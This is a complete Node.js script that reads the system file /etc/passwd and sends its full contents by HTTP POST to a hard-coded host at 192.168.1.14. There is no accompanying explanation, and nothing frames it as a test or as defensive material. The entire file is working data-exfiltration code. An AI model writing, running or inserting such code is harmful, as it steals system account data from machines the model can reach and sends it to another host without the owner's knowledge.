const fs = require('fs');
const http = require('http');

const filePath = '/etc/passwd';
const targetUrl = '192.168.1.14'; // IP address without protocol

// Read /etc/passwd
fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
        console.error('Error reading file:', err);
        return;
    }

    // Send the content via POST request
    sendPostRequest(targetUrl, data);
});

function sendPostRequest(targetUrl, data) {
    const options = {
        hostname: targetUrl,
        port: 80, // Default HTTP port
        path: '/',
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain',
            'Content-Length': Buffer.byteLength(data),
        },
    };

    const req = http.request(options, (res) => {
        console.log(`POST Response Status: ${res.statusCode}`);
        
        // Consume response data to free up memory
        res.on('data', (chunk) => {
            process.stdout.write(chunk);
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    // Write data to request body
    req.write(data);
    req.end();
}
